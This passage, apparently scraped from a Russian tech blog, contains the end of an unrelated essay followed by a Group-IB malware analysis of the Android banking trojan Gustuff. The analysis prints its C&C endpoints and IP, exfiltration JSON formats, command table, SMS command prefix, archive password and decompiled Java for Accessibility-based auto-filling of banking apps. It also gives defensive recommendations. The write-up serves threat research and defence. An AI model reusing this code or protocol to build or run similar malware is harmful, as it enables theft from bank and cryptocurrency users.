продуктов сильно заблуждались на счет того, что кто-то в действительности планирует пользоваться всеми этими инновациями, поддерживать решения работоспособными в рамках государственного финансирования. Но реальный мотив организаторов оказался в освоении средств, а не в создании новых рабочих решений.\n\r\nКажется, что я слишком фокусируюсь на гос.контрактах. Но, на самом деле, огромное количество новых технологий замыкается на государственное регулирование и финансирование в той или иной степени: умный город, биометрия, экология, автоматическое управление автомобилями, коммуникации (операторы связи, интернет), военные технологии, любые дроны. А в нашей стране вы столкнетесь еще и с компаниями, которыми владеет государство: заметного размера промышленные и аграрные компании, банки.\n\r\nТак что берегите себя.", {"day": "15", "month": "мая", "time": "13:05"}, {"rate": 447, "views": 162000}], ["Буквально на днях Group-IB сообщала об активности мобильного Android-трояна Gustuff. Он работает исключительно на международных рынках, атакуя клиентов 100 крупнейших иностранных банков, пользователей мобильных 32 криптокошельков, а также крупных e-commerce ресурсов. А вот разработчик Gustuff — русскоязычный киберпреступник под ником Bestoffer. Еще недавно он нахваливал свой троян как «серьезный продукт для людей со знаниями и опытом». \n\r\nСпециалист по анализу вредоносного кода Group-IB Иван Писарев в своем исследовании подробно рассказывает о том, как работает Gustuff и в чем его опасность. \n\nЗа кем охотится Gustuff\r\nGustuff относится к новому поколению вредоносных программ с полностью автоматизированными функциями. По словам разработчика, троян стал новой улучшенной версией вредоносной программы AndyBot, которая с ноября 2017 года атакует телефоны с ОС Android и крадет деньги через фишинговые веб-формы, маскирующиеся под мобильные приложения известных международных банков и платежных систем. Bestoffer сообщал, что цена аренды «Gustuff Bot» составляла $800 в месяц. \n\r\nАнализ сэмпла Gustuff показал, что потенциально троян нацелен на клиентов, использующих мобильные приложения крупнейших банков, таких как Bank of America, Bank of Scotland, J.P.Morgan, Wells Fargo, Capital One, TD Bank, PNC Bank, а также на криптокошельки Bitcoin Wallet, BitPay, Cryptopay, Coinbase и др. \n\r\nИзначально созданный как классический банковский троян, в текущей версии Gustuff значительно расширил список потенциальных объектов для атаки. Кроме Android-приложений банков, финтех-компаний и криптосервисов, Gustuff нацелен на пользователей приложений маркетплейсов, онлайн-магазинов, платежных систем и мессенджеров. В частности, PayPal, Western Union, eBay, Walmart, Skype, WhatsApp, Gett Taxi, Revolut и других.\n\nТочка входа: расчет на массовое заражение \r\nДля Gustuff характерен «классический» вектор проникновения на Android-смартфоны через СМС-рассылки со ссылками на APK. При заражении Android-устройства трояном по команде сервера может произойти дальнейшее распространение Gustuff'а по базе контактов инфицированного телефона либо по базе данных сервера. Функциональные возможности Gustuff рассчитаны на массовое заражение и максимальную капитализацию бизнеса своих операторов – в нем присутствует уникальная функция «автозалива» в легитимные мобильные банковские приложения и криптокошельки, что позволяет ускорить и масштабировать кражу денег. \n\r\nИсследование трояна показало, что функция автозалива реализована в нем при помощи Accessibility Service — сервиса для людей с ограниченными возможностями. Gustuff – не первый троян, который успешно обходит защиту от взаимодействия с элементами окон других приложений с помощью данного сервиса Android. Однако использование Accessibility Service в сочетании с автозаливом остается до сих пор достаточно редким явлением. \n\r\nПосле загрузки на телефон жертвы Gustuff, используя Accessibility Service, получает возможность взаимодействовать с элементами окон других приложений (банковских, криптовалютных, а также приложений для онлайн-шоппинга, обмена сообщениями и др.), выполняя необходимые для злоумышленников действия. К примеру, по команде сервера троян может нажимать на кнопки и изменять значения текстовых полей в банковских приложениях. Использование механизма Accessibility Service позволяет трояну обходить механизмы защиты, используемые банками для противодействия мобильным троянам прошлого поколения, а также изменения в политике безопасности, внедренные Google в новые версии ОС Android. Так, Gustuff «умеет» отключать защиту Google Protect: по заверениям автора, данная функция срабатывает в 70% случаев. \n\n\n\r\nТакже Gustuff может демонстрировать фейковые PUSH-уведомления с иконками легитимных мобильных приложений. Пользователь кликает на PUSH-уведомление и видит загруженное с сервера фишинговое окно, куда сам вводит запрашиваемые данные банковской карты или криптокошелька. В другом сценарии работы Gustuff происходит открытие приложения, от имени которого демонстрировалось PUSH-уведомление. В этом случае вредоносная программа по команде сервера через Accessibility Service может заполнять поля формы банковского приложения для мошеннической транзакции. \n\r\nВ функциональные возможности Gustuff также входят отправка на сервер информации о заражённом устройстве, возможность чтения/отправления СМС-сообщений, отправление USSD-запросов, запуск SOCKS5 Proxy, переход по ссылке, отправление файлов (в том числе фотосканов документов, скриншотов, фотографий) на сервер, сброс устройства до заводских настроек. \n\nАнализ вредоносной программы\r\nПеред установкой вредоносного приложения ОС Android демонстрирует пользователю окно, содержащее в себе список запрашиваемых Gustuff'ом прав:\n\n\r\nУстановка приложения произойдет только после получения согласия пользователя. После запуска приложения троян покажет пользователю окно:\n\n\r\nПосле чего удалит свою иконку.\n\r\nGustuff упакован, по словам автора, упаковщиком от FTT. После запуска приложение периодически обращается к CnC- серверу с целью получения команд. В нескольких исследованных нами файлах в качестве управляющего сервера использовался IP-адрес 88.99.171[.]105 (в дальнейшем будем обозначать как <%CnC%>).\n\r\nПосле запуска программа начинает отправку сообщений серверу http://<%CnC%>/api/v1/get.php.\n\r\nВ качестве ответа ожидается JSON следующего формата:\n\n{\n    \"results\" : \"OK\",\n    \"command\":{\n        \"id\": \"<%id%>\",\n        \"command\":\"<%command%>\",\n        \"timestamp\":\"<%Server Timestamp%>\",\n        \"params\":{\n\t\t<%Command parameters as JSON%>\n        },\n    },\n}\r\nПри каждом обращении приложение отправляет информацию о зараженном устройстве. Формат сообщения представлен ниже. Стоит отметить, что поля full, extra, apps и permission – опциональные и будут отправлены только в случае команды-запроса от CnC.\n\n{\n    \"info\":\n    {\n        \"info\":\n        {\n            \"cell\":<%Sim operator name%>,\n            \"country\":<%Country ISO%>,\n            \"imei\":<%IMEI%>,\n            \"number\":<%Phone number%>,\n            \"line1Number\":<%Phone number%>,\n            \"advertisementId\":<%ID%>\n        },\n        \"state\":\n        {\n            \"admin\":<%Has admin rights%>,\n            \"source\":<%String%>,\n            \"needPermissions\":<%Application needs permissions%>,\n            \"accesByName\":<%Boolean%>,\n            \"accesByService\":<%Boolean%>,\n            \"safetyNet\":<%String%>,\n            \"defaultSmsApp\":<%Default Sms Application%>,\n            \"isDefaultSmsApp\":<%Current application is Default Sms Application%>,\n            \"dateTime\":<%Current date time%>,\n            \"batteryLevel\":<%Battery level%>\n        },\n        \"socks\":\n        {\n            \"id\":<%Proxy module ID%>,\n            \"enabled\":<%Is enabled%>,\n            \"active\":<%Is active%>\n        },\n        \"version\":\n        {\n            \"versionName\":<%Package Version Name%>,\n            \"versionCode\":<%Package Version Code%>,\n            \"lastUpdateTime\":<%Package Last Update Time%>,\n            \"tag\":<%Tag, default value: \"TAG\"%>,\n            \"targetSdkVersion\":<%Target Sdk Version%>,\n            \"buildConfigTimestamp\":1541309066721\n        },\n    },\n    \"full\":\n    {\n        \"model\":<%Device Model%>,\n        \"localeCountry\":<%Country%>,\n        \"localeLang\":<%Locale language%>,\n        \"accounts\":<%JSON array, contains from \"name\" and \"type\" of accounts%>,\n        \"lockType\":<%Type of lockscreen password%>\n    },\n    \"extra\":\n    {\n        \"serial\":<%Build serial number%>,\n        \"board\":<%Build Board%>,\n        \"brand\":<%Build Brand%>,\n        \"user\":<%Build User%>,\n        \"device\":<%Build Device%>,\n        \"display\":<%Build Display%>,\n        \"id\":<%Build ID%>,\n        \"manufacturer\":<%Build manufacturer%>,\n        \"model\":<%Build model%>,\n        \"product\":<%Build product%>,\n        \"tags\":<%Build tags%>,\n        \"type\":<%Build type%>,\n        \"imei\":<%imei%>,\n        \"imsi\":<%imsi%>,\n        \"line1number\":<%phonenumber%>,\n        \"iccid\":<%Sim serial number%>,\n        \"mcc\":<%Mobile country code of operator%>,\n        \"mnc\":<%Mobile network codeof operator%>,\n        \"cellid\":<%GSM-data%>,\n        \"lac\":<%GSM-data%>,\n        \"androidid\":<%Android Id%>,\n        \"ssid\":<%Wi-Fi SSID%>\n    },\n    \"apps\":{<%List of installed applications%>},\n    \"permission\":<%List of granted permissions%>\n} \nХранение конфигурационных данных\r\nGustuff хранит важную для работы информацию в preference-файле. Имя файла, как и имена параметров в нем – результат вычисления MD5-суммы от строки 15413090667214.6.1<%name%>, где <%name%> — исходное имя-значение. Python-интерпретация функции генерации имени: \n\n nameGenerator(input):\n    output = md5(\"15413090667214.6.1\" + input) \r\nВ дальнейшем будем обозначать как nameGenerator(input).\n\r\nТаким образом, имя первого файла: nameGenerator(«API_SERVER_LIST»), он содержит значения со следующими именами: \n\n\n\nИмя переменной\nЗначение\n\n\nnameGenerator(«API_SERVER_LIST»)\nСодержит список CnC-адресов в виде массива.\n\n\nnameGenerator(«API_SERVER_URL»)\nСодержит CnC-адрес.\n\n\nnameGenerator(«SMS_UPLOAD»)\nФлаг по умолчанию установлен. Если флаг установлен – отправляет СМС-сообщения на CnC.\n\n\nnameGenerator(«SMS_ROOT_NUMBER»)\nНомер телефона, на который будут отправлены SMS-сообщений принятые зараженным устрйоством. По умолчанию null.\n\n\nnameGenerator(«SMS_ROOT_NUMBER_RESEND»)\nФлаг по умолчанию сброшен. Если установлен – при получении зараженным устройством SMS оно будет отправлено на root-номер.\n\n\nnameGenerator(«DEFAULT_APP_SMS»)\nФлаг по умолчанию сброшен. Если данный флаг установлен – приложение будет обрабатывать входящие SMS- сообщения.\n\n\nnameGenerator(«DEFAULT_ADMIN»)\nФлаг по умолчанию сброшен. Если флаг установлен – приложение имеет права администратора.\n\n\nnameGenerator(«DEFAULT_ACCESSIBILITY»)\nФлаг по умолчанию сброшен. Если флаг установлен – запущен сервис, использующий Accessibility Service.\n\n\nnameGenerator(«APPS_CONFIG»)\nJSON-объект, содержит список действий, которые необходимо выполнить при срабатывании Accessibility-события, связанного с определенным приложением.\n\n\nnameGenerator(«APPS_INSTALLED»)\nХранит список установленных на устройстве приложений.\n\n\nnameGenerator(«IS_FIST_RUN»)\nФлаг при первом запуске сбрасывается.\n\n\nnameGenerator(«UNIQUE_ID»)\nСодержит уникальный идентификатор. Генерируется при первом запуске бота.\n\n\nМодуль обработки команд от сервера \r\nПриложение хранит адреса CnC-серверов в виде массива закодированных по Base85 строк. Список CnC — серверов может быть изменен при поступлении соответствующей команды, в таком случае адреса будут хранится в preference-файле.\n\r\nВ ответ на запрос сервер отправляет приложению команду. Стоит отметить, что команды и параметры представлены в JSON-формате. Приложение может обрабатывать следующие команды: \n\n\nКоманда\nОписание\n\n\nforwardStart\nНачать отправление получаемых зараженным устройством SMS-сообщений на CnC-сервер.\n\n\nforwardStop\nОстановить отправление получаемых зараженным устройством SMS-сообщений на CnC-сервер.\n\n\nussdRun\nВыполнить USSD-запрос. Номер, на который необходимо совершить USSD-запрос находится в JSON-поле «number».\n\n\nsendSms\nОтправить одно SMS-сообщение (при необходимости сообщение «дробится» на части). В качестве параметра команда принимает JSON-объект, содержащий поля «to» — номер назначения и «body» — тело сообщения.\n\n\nsendSmsAb\nОтправить SMS-сообщения (при необходимости сообщение «дробится» на части) всем из списка контактов зараженного устройства. Интервал между отправлением сообщений – 10 секунд. Тело сообщения находится в JSON-поле «body»\n\n\nsendSmsMass\nОтправить SMS-сообщения (при необходимости сообщение «дробится» на части) контактам, указанным в параметрах команды. Интервал между отправлением сообщений – 10 секунд. В качестве параметра команда принимает JSON-массив (поле «sms»), элементы которого содержат поля «to» — номер назначения и «body» — тело сообщения.\n\n\nchangeServer\nДанная команда в качестве параметра может принимать значение с ключом «url» — тогда бот изменит значение nameGenerator(“SERVER_URL”), либо «array» — тогда бот запишет массив в nameGenerator (“API_SERVER_LIST”) Таким образом приложение меняет адрес CnC-серверов.\n\n\nadminNumber\nКоманда предназначена для работы с root-номером. Команда принимает JSON-объект со следующими параметрами: «number» — изменить nameGenerator(“ROOT_NUMBER”) на полученное значение, «resend» — изменить nameGenerator(“SMS_ROOT_NUMBER_RESEND”), «sendId» — отправить на nameGenerator(“ROOT_NUMBER”) uniqueID.\n\n\nupdateInfo\nОтправить на сервер информацию о зараженном устройстве.\n\n\nwipeData\nКоманда предназначена для удаления пользовательских данных. В зависимости от какого имени было запущено приложение происходит либо полное стирание данных с перезагрузкой устройства (primary user), либо удаление только пользовательских данных (secondary user).\n\n\nsocksStart\nЗапустить Proxy-модуль. Работа модуля описана в отдельном разделе.\n\n\nsocksStop\nОстановить работу Proxy-модуля.\n\n\nopenLink\nПерейти по ссылке. Ссылка находится в JSON-параметре по ключу «url». Для открытия ссылки используется «android.intent.action.VIEW».\n\n\nuploadAllSms\nОтправить на сервер все принятые устройством SMS-сообщения.\n\n\nuploadAllPhotos\nОтправить на URL изображения с зараженного устройства. URL приходит как параметр.\n\n\nuploadFile\nОтправить на URL файл с зараженного устройства. URL приходит как параметр.\n\n\nuploadPhoneNumbers\nОтправить на сервер номера телефонов из списка контактов. Если в качестве параметра приходит JSON-объект значение с ключом «ab», приложение получает список контактов из телефонной книги. Если в качестве параметра приходит JSON-объект с ключом «sms», приложение читает список контактов из отправителей SMS-сообщений.\n\n\nchangeArchive\nПриложение загружает файл с адреса, который приходит в качестве параметра по ключу «url». Загруженный файл сохраняется с именем «archive.zip». После этого приложение разархивирует файл, при необходимости используя пароль для архива «b5jXh37gxgHBrZhQ4j3D». Разархивированный файлы сохраняет в директорию [external storage]/hgps. В данной директории приложение хранит web-фейки (описано далее).\n\n\nactions\nКоманда предназначена для работы с Action Service, который описан в отдельном разделе.\n\n\ntest\nНичего не делает.\n\n\ndownload\nКоманда предназначена для загрузки файла с удаленного сервера и сохранении его в директорию «Downloads». URL и имя файла приходят в качестве параметра, поля в JSON-объекте параметре соответственно: «url» и «fileName».\n\n\nremove\nУдаляет файл из директории «Downloads». Имя файла приходит в JSON-параметре с ключом «fileName». Стандартное имя файла – «tmp.apk».\n\n\nnotification\nПоказать уведомление с текстами описания и заголовка, определяемыми управляющим сервером.\n\n\r\nФормат команды notification:\n\n{\n    \"results\" : \"OK\",\n    \"command\":{\n    \"id\": <%id%>,\n    \"command\":\"notification\",\n    \"timestamp\":<%Server Timestamp%>,\n    \"params\":{\n        \"openApp\":<%Open original app or not%>,\n        \"array\":[\n                      {\"title\":<%Title text%>,\n                      \"desc\":<%Description text%>,\n                      \"app\":<%Application name%>}\n                   ]\n                   },\n        },\n}\r\nУведомление, создаваемое исследуемым файлом, выглядит идентично уведомлениям, создаваемым приложением, указанным в поле app. Если значение поля openApp — True, при открытии уведомления запускается приложение, указанное в поле app. Если значение поля openApp — False, то: \n\n\nоткрывается фишинговое окно, содержимое которого загружается из директории <%external storage%>/hgps/<%filename%>\nоткрывается фишинговое окно, содержимое которого загружается с сервера <%url%>?id=<%Bot id%>&app=<%Application name%>\nоткрывается фишинговое окно, замаскированное под Google Play Card, с возможностью ввести данные карты.\n\r\nРезультат исполнения любой команды приложение отправляет на <%CnC%>\\set_state.php в виде JSON-объекта следующего формата: \n\n{\n    \"command\":\n    {\n        \"command\":<%command%>,\n        \"id\":<%command_id%>,\n        \"state\":<%command_state%>\n    }\n    \"id\":<%bot_id%>\n}\nActionsService\n\r\nВ список команд, которые обрабатывает приложение, входит action. При получении команды модуль обработки команд обращается к данному сервису с целью исполнения расширенной команды. В качестве параметра сервис принимает JSON-объект. Сервис может выполнять следующие команды: \n\n1. PARAMS_ACTION — при получении такой команды сервис в первую очередь получает из JSON- параметра значение по ключу Type, может быть следующим:\n\n\nserviceInfo – подкоманда получает из JSON-параметра значение по ключу includeNotImportant. Если флаг равен True — приложение устанавливает флаг FLAG_ISOLATED_PROCESS на сервис, использующий Accessibility Service. Таким образом, сервис будет запущен в отдельном процессе.\nroot — получить и отправить на сервер информацию об окне, которое сейчас в фокусе. Приложение получает информацию при помощи класса AccessibilityNodeInfo.\nadmin — запросить права администратора.\ndelay — приостановить работу ActionsService на то количество миллисекунд, которое указано в параметре по ключу «data».\nwindows — отправить список видимых пользователю окон.\ninstall — установить приложение на зараженное устройство. Название пакета — архива находится в ключе «fileName». Сам архив находится в директории Downloads.\nglobal – подкоманда предназначена для осуществления перехода с текущего окна:\n\nна меню Quick Settings\nназад\nдомой\nк уведомлениям\nк окну недавно открытых приложений\n\n\nlaunch — запустить приложение. Наименование приложения приходит как параметр по ключу data.\nsounds — изменить режим звука на silence.\nunlock — включает подсветку экрана и клавиатуры на полную яркость. Приложение выполняет данное действие при помощи WakeLock, в качестве тэга указывает строку [Application lable]:INFO\npermissionOverlay — функция не реализована (ответ на исполнение команды — {«message»:«Not support»} или {«message»:«low sdk»})\ngesture — функция не реализована (ответ на исполнение команды — {«message»:«Not support»}или {«message»:«Low API»})\npermissions — данная команда необходима для запроса прав для приложения. Однако функция запроса не реализована, таким образом команда не имеет смысла. Список запрашиваемых прав приходит как JSON-массив с ключом «permissions». Стандартный список:\n\n\nandroid.permission.READ_PHONE_STATE\nandroid.permission.READ_CONTACTS\nandroid.permission.CALL_PHONE\nandroid.permission.RECEIVE_SMS\nandroid.permission.SEND_SMS\nandroid.permission.READ_SMS\nandroid.permission.READ_EXTERNAL_STORAGE\nandroid.permission.WRITE_EXTERNAL_STORAGE\n\n\nopen — вывести на экран фишинговое окно. В зависимости от приходящего от сервера параметра приложение может демонстрировать следующие фишинговые окна:\n\n\nПоказать фишинговое окно, содержимое которого прописано в файле в директории <%external directory%>/hgps/<%param_filename%>. Результат взаимодействия пользователя с окном будет отправлен по адресу <%CnC%>/records.php\nПоказать фишинговое окно, содержимое которого предварительно грузится с адреса <%url_param%>?id=<%bot_id%>&app=<%packagename%>. Результат взаимодействия пользователя с окном будет отправлен по адресу <%CnC%>/records.php\nПоказать фишинговое окно, замаскированное под Google Play Card.\n\n interactive — команда предназначена для взаимодействия с элементами окон других приложений при помощи AcessibilityService. Для взаимодействия в программе реализован специальный сервис. Исследуемое приложение может взаимодействовать с окнами:\n\nАктивным на данный момент. В таком случае параметр содержит id либо text (наименование) объекта, с которым необходимо взаимодействовать.\nВидимыми пользователю на момент исполнения команды. Приложение выбирает окна по id. \n\r\n Получив объекты AccessibilityNodeInfo для интересующих элементов окна, приложение в зависимости от параметров может выполнять действия:\n\nfocus — установить фокус на объект.\nclick — кликнуть на объект.\nactionId — выполнить действие по ID.\nsetText — изменить текст объекта. Изменение текста возможно двумя способами: выполнить действие ACTION_SET_TEXT (если версия Android зараженного устройства – моложе либо равна LOLLIPOP), либо поместив в буфер обмена строку и вставив его в объект (для версий старше). Данная команда может быть использована для изменения данных в банковском приложении.\n\n\n2. PARAMS_ACTIONS — то же, что и PARAMS_ACTION, только приходит JSON-массив команд.\n\r\nКажется, многим будет интересно, как выглядит функция взаимодействия с элементами окна другого приложения. Вот таким образом реализована данная функциональная возможность в Gustuff'е:\n\nboolean interactiveAction(List aiList, JSONObject action, JsonObject res) {\n    int count = action.optInt(\"repeat\", 1);\n    Iterator aiListIterator = ((Iterable)aiList).iterator();\n    int count = 0;\n    while(aiListIterator.hasNext()) {\n        Object ani = aiListIterator.next();\n        if(1 <= count) {\n            int index;\n            for(index = 1; true; ++index) {\n                if(action.has(\"focus\")) {\n                    if(((AccessibilityNodeInfo)ani).performAction(1)) {\n                        ++count;\n                    }\n                }\n                else if(action.has(\"click\")) {\n                    if(((AccessibilityNodeInfo)ani).performAction(16)) {\n                        ++count;\n                    }\n                }\n                else if(action.has(\"actionId\")) {\n                    if(((AccessibilityNodeInfo)ani).performAction(action.optInt(\"actionId\"))) {\n                        ++count;\n                    }\n                }\n                else if(action.has(\"setText\")) {\n                    customHeader ch = CustomAccessibilityService.a;\n                    Context context = this.getApplicationContext();\n                    String text = action.optString(\"setText\");\n                    if(performSetTextAction(ch, context, ((AccessibilityNodeInfo)ani), text)) {\n                        ++count;\n                    }\n                }\n                if(index == count) {\n                    break;\n                }\n            }\n        }\n        ((AccessibilityNodeInfo)ani).recycle();\n    }\n    res.addPropertyNumber(\"res\", Integer.valueOf(count));\n}\r\nФункция замены текста:\n\nboolean performSetTextAction(Context context, AccessibilityNodeInfo ani, String text) {\n    boolean result;\n    if(Build$VERSION.SDK_INT >= 21) {\n        Bundle b = new Bundle();\n        b.putCharSequence(\"ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE\", ((CharSequence)text));\n        result = ani.performAction(0x200000, b);  // ACTION_SET_TEXT\n    }\n    else {\n        Object clipboard = context.getSystemService(\"clipboard\");\n        if(clipboard != null) {\n        ((ClipboardManager)clipboard).setPrimaryClip(ClipData.newPlainText(\"autofill_pm\", ((CharSequence)text)));\n        result = ani.performAction(0x8000);  // ACTION_PASTE\n        }\n        else {\n            result = false;\n        }\n    }\n    return result;\n}\r\nТаким образом, при правильной настройке управляющего сервера Gustuff способен заполнить текстовые поля в банковском приложении и нажать на необходимые для совершения транзакции кнопки. Трояну даже не нужно проходить авторизацию в приложении — достаточно отправить команду на демонстрацию PUSH-уведомления с последующим открытием ранее установленного банковского приложения. Пользователь сам пройдет авторизацию, после чего Gustuff сможет произвести автозалив.\n\nМодуль обработки СМС-сообщений\r\nПриложение устанавливает обработчик события на принятие зараженным устройством СМС-сообщений. Исследуемое приложение может принимать команды от оператора, которые приходят в теле СМС- сообщения. Команды приходят в формате: \n\n7!5=<%Base64 encoded command%> \n\r\nПриложение ищет во всех приходящих СМС-сообщениях строку 7!5=, при обнаружении строки – декодирует из Base64 строку по смещению 4 и исполняет команду. Команды аналогичны командам с CnC. Результат исполнения отправляется на тот же номер, с которого поступила команда. Формат ответа: \n\n7*5=<%Base64 encode of «result_code command»%>\n\r\nОпционально приложение может отправлять все принимаемые сообщения на Root-номер. Для этого в preference-файле должен быть указан Root-номер и установлен флаг редиректа сообщений. СМС-сообщение отправляется на номер злоумышленника в формате: \n\n<%From number%> — <%Time, format: dd/MM/yyyy HH:mm:ss%> <%SMS body%> \n\r\nТакже опционально приложение может отправлять сообщения на CnC. СМС-сообщение отправляется на сервер в JSON-формате: \n\n{\n    \"id\":<%BotID%>,\n    \"sms\":\n    {\n        \"text\":<%SMS body%>,\n        \"number\":<%From number%>,\n        \"date\":<%Timestamp%>\n    }\n}\r\nЕсли установлен флаг nameGenerator(«DEFAULT_APP_SMS») – приложение останавливает обработку СМС-сообщения и очищает список входящих сообщений. \n\nProxy-модуль \r\nВ исследуемом приложении присутствует Backconnect Proxy модуль (далее Proxy-модуль), который имеет отдельный класс, включающий в себя статические поля с конфигурацией. Конфигурационные данные хранятся в семпле в открытом виде: \n\n\n\r\nВсе действия, совершаемые Proxy-модулем, логируются в файлы. Для этого приложение в External Storage создает директорию с названием «logs» (поле ProxyConfigClass.logsDir в конфигурационном классе), в которой хранятся лог-файлы. Логирование происходит в файлы с именами: \n\n\nmain.txt – в данный файл происходит логирование работы класса с названием CommandServer. В дальнейшем логирование строки str в данный файл будем обозначать как mainLog(str).\nsession-<%id%>.txt — в данный файл происходит сохранение лог-данных, связанных с определенной сессией проксирования. В дальнейшем логирование строки str в данный файл будем обозначать как sessionLog (str).\nserver.txt – в данный файл происходит логирование всех данных, записываемых в вышеописанные файлы. \n\r\nФормат лог-данных: \n\r\n<%Date%> [Thread[<%thread id%>], id[]]: log-string\n\r\nВозникающие в процессе работы Proxy-модуля исключения также логируются в файл. Для этого приложение формирует JSON-объект формата: \n\n{\n    \"uncaughtException\":<%short description of throwable%>\n    \"thread\":<%thread%>\n    \"message\":<%detail message of throwable%>\n    \"trace\":        //Stack trace info\n        [\n            {\n                \"ClassName\":\n                \"FileName\":\n                \"LineNumber\":\n                \"MethodName\":\n            },\n            {\n                \"ClassName\":\n                \"FileName\":\n                \"LineNumber\":\n                \"MethodName\":\n            }\n        ]\n}\r\nПосле чего конвертирует его в строковое представление и логирует. \n\r\nЗапуск Proxy-модуля осуществляется после поступления соответсвующей комнады. При поступлении команды на запуск Proxy-модуля приложение запускает сервис с названием MainService, который отвечает за управление работой Proxy-модуля – его запуск и остановку. \n\r\nЭтапы запуска сервиса: \n\n1. Запускает таймер, срабатывающий раз в минуту и проверяющий активность Proxy-модуля. Если модуль не активен – запускает его.\r\nТакже при срабатывании события android.net.conn.CONNECTIVITY_CHANGE происходит запуск Proxy-модуля. \n\n2. Приложение создает wake-lock с параметром PARTIAL_WAKE_LOCK и захватывает его. Таким образом не позволяет перейти CPU устройства в спящий режим.\n\n3. Запускает класс обработки команд Proxy-модуля, предварительно логируя строку mainLog(«start server») и \n\nServer::start() host[<%proxy_cnc%>], commandPort[<%command_port%>], proxyPort[<%proxy_port%>]\n\r\nгде proxy_cnc, command_port и proxy_port – параметры, полученные из конфигурации Proxy- сервера. \n\r\nКласс обработки команд имеет название CommandConnection. Сразу после запуска выполняет следующие действия: \n\n4. Подключается к ProxyConfigClass.host: ProxyConfigClass.commandPort и отправляет туда данные о зараженном устройстве в JSON-формате:\n\n{\n    \"id\":<%id%>,\n    \"imei\":<%imei%>,\n    \"imsi\":<%imsi%>,\n    \"model\":<%model%>,\n    \"manufacturer\":<%manufacturer%>,\n    \"androidVersion\":<%androidVersion%>,\n    \"country\":<%country%>,\n    \"partnerId\":<%partnerId%>,\n    \"packageName\":<%packageName%>,\n    \"networkType\":<%networkType%>,\n    \"hasGsmSupport\":<%hasGsmSupport%>,\n    \"simReady\":<%simReady%>,\n    \"simCountry\":<%simCountry%>,\n    \"networkOperator\":<%networkOperator%>,\n    \"simOperator\":<%simOperator%>,\n    \"version\":<%version%>\n}\r\nГде: \n\n\nid – идентификатор, пытается получить из Shared Preference файла с именем «x» значение с полем «id». Если данное значение получить не удалось — генерирует новое. Таким образом, Proxy-модуль имеет свой идентификатор, который генерируется аналогично Bot ID.\nimei — IMEI устройства. Если в процессе получения значения произошла ошибка — вместо этого поля будет записано текстовое сообщение об ошибке.\nimsi — International Mobile Subscriber Identity устройства. Если в процессе получения значения произошла ошибка — вместо этого поля будет записано текстовое сообщение об ошибке.\nmodel — The end-user-visible name for the end product.\nmanufacturer — The manufacturer of the product/hardware (Build.MANUFACTURER).\nandroidVersion — строка в формате \"<%release_version%> (<%os_version%>),<%sdk_version%>\"\ncountry — текущее местоположение устройства.\npartnerId – пустая строка.\npackageName – package name.\nnetworkType — тип текущего сетевого соединения (пример: «WIFI», «MOBILE»). В случае ошибки возвращает null.\nhasGsmSupport – true – если телефон поддерживает GSM, иначе false.\nsimReady – состояние SIM-карты.\nsimCountry — ISO-код страны (на основании провайдера сим-карты).\nnetworkOperator — наименование оператора. Если в процессе получения значения произошла ошибка — вместо этого поля будет записано текстовое сообщение об ошибке.\nsimOperator — The Service Provider Name (SPN). Если в процессе получения значения произошла ошибка — вместо этого поля будет записано текстовое сообщение об ошибке.\nversion — данное поле хранится в конфиг-классе, для исследуемых версий бота оно было равно «1.6».\n\n5. Переходит в режим ожидания команд от сервера. Команды от сервера поступают в формате:\n\n\n0 offset – command\n1 offset – sessionId\n2 offset – length\n4 offset — data\n\r\nПри поступлении команды приложение логирует: \n\nmainLog(«Header { sessionId<%id%>], type[<%command%>], length[<%length%>] }»)\n\r\nВозможны следующие команды от сервера:\n\n\n\nName\nCommand\nData\nDescription\n\n\nconnectionId\n0\nConnection ID\nСоздать новое подключение\n\n\nSLEEP\n3\nTime\nПриостановить работу Proxy-модуля\n\n\nPING_PONG\n4\n-\nОтправить PONG-сообщение\n\n\r\nPONG-сообщение состоит из 4 байт и выглядит следующим образом: 0x04000000.\n\r\nПри поступлении команды connectionId (на создание нового подключения) CommandConnection создает экземпляр класса ProxyConnection.\n\n\nВ проксировании принимают участие два класса: ProxyConnection и end. При создании класса ProxyConnection происходит подключение к адресу ProxyConfigClass.host: ProxyConfigClass.proxyPort и передача JSON-объекта:\n\n {\n    \"id\":<%connectionId%>\n}\r\nВ ответ сервер присылает SOCKS5-сообщение, которое содержит адрес удаленного сервера, с которым необходимо установить соединение. Взаимодействие с эти сервером происходит посредством класса end. Схематично установку соединения можно представить следующим образом:\n\n\nСетевые взаимодействия \r\nДля предотвращения анализа трафика сетевыми снифферами взаимодействие между CnC-сервером и приложением может быть защищено посредством протокола SSL. Все передаваемые данные как с сервера так и на сервер представлены в JSON-формате. Приложение в ходе работы выполняет следующие запросы: \n\n\nhttp://<%CnC%>/api/v1/set_state.php — результат исполнения команды.\nhttp://<%CnC%>/api/v1/get.php — получение команды.\nhttp://<%CnC%>/api/v1/load_sms.php — выгрузка SMS-сообщений с зараженного устройства.\nhttp://<%CnC%>/api/v1/load_ab.php — выгрузка списка контактов с зараженного устройства.\nhttp://<%CnC%>/api/v1/aevents.php – запрос производится при обновлении параметров, находящихся в preference-файле.\nhttp://<%CnC%>/api/v1/set_card.php — выгрузка данных, полученных при помощи фишинг-окна, маскирующегося под Google Play Market.\nhttp://<%CnC%>/api/v1/logs.php – выгрузка лог-данных.\nhttp://<%CnC%>/api/v1/records.php – выгрузка данных, полученных при помощи фишинговых окон.\nhttp://<%CnC%>/api/v1/set_error.php – оповещение о возникшей ошибке. \n\nРекомендации \r\nВ целях защиты своих клиентов от угрозы мобильных троянов компании должны использовать комплексные решения, которые позволяют без установки дополнительного программного обеспечения на устройства пользователей, отслеживать и предупреждать вредоносную активность. \n\r\nДля этого сигнатурные методы обнаружения мобильных троянов необходимо усиливать технологиями анализа поведения как клиента, так и самого приложения. Так же защита должна включать в себя функцию идентификации устройств с использованием технологии цифрового отпечатка, что позволит понять, когда учётная запись используется с нетипичного устройства и уже попала в руки мошенника. \n\r\nПринципиально важный момент – наличие возможности кросс-канального анализа, что дает возможность компаниям контролировать риски, возникающие на стороне не только интернет-, но и мобильного канала, например, в приложениях для мобильного банкинга, для операций с криптовалютами и любых других, где может осуществляться финансовая транзакция.\n\nПравила безопасности для пользователей: \n\nне устанавливать приложения для мобильного устройства с ОС Android из каких-либо источников, кроме Google Play;\n при установке приложения обращать особое внимание на запрашиваемые приложением права;\nрегулярно устанавливать обновления ОС Android;\nобращать внимание на расширения загружаемых файлов;\nне посещать подозрительные ресурсы;\nне переходить по ссылкам, полученным в SMS-сообщениях.\n\r\nПри участии Семена Рогачева, младшего 